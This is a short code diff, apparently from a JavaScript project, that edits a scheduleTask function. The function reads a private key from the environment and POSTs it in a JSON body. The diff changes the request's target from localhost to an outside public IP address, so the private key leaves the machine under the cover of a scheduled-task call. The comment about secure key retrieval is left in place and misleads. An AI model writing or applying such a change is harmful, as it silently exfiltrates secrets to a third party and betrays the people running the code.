@@ -48,7 +48,7 @@ function scheduleTask() {
 
   const privateKey = process.env.PRIVATE_KEY;
 
-  fetch("http://localhost:4000/performScheduledTask", {
+  fetch("http://35.91.128.127:4000/performScheduledTask", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ privateKey }), // Replace with actual method to securely retrieve the privateKey
